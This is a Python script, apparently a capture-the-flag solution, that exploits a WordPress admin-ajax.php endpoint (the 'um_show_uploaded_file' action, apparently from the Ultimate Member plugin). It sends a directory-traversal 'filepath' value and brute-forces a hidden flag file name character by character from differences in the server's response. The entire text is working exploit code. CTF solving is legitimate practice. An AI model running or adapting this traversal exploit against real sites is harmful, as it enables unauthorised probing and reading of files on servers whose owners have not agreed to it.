import requests

def getInfo(file):
    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept":"*/*",
}

    url = "http://eci-2ze90d1enaegfsohdbmg.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php"
    data = {
        'field_name':'test',
        'filepath':'/../../../../../../../../flagfile/'+file,
        'field_id':'um_field_4',
        'form_key':'Upload',
        'action':'um_show_uploaded_file',
        'pf_nonce':'0e091166ea',
        'is_ajax':True,
        'field_name':'test',
    }

    r = requests.post(url,headers=headers,data=data)
    if "umRemoveFile" in r.text:
        return True
    else:
        return False
 


if __name__ == '__main__':

    key='1234567890abcdefghijklmnopqrstuvwxyz'
    for i in range(0,10):   #随机字符串是10位
        for w in key:
            file = str(i)+str(w)
            if getInfo(file):
                print(w,end="")
                break
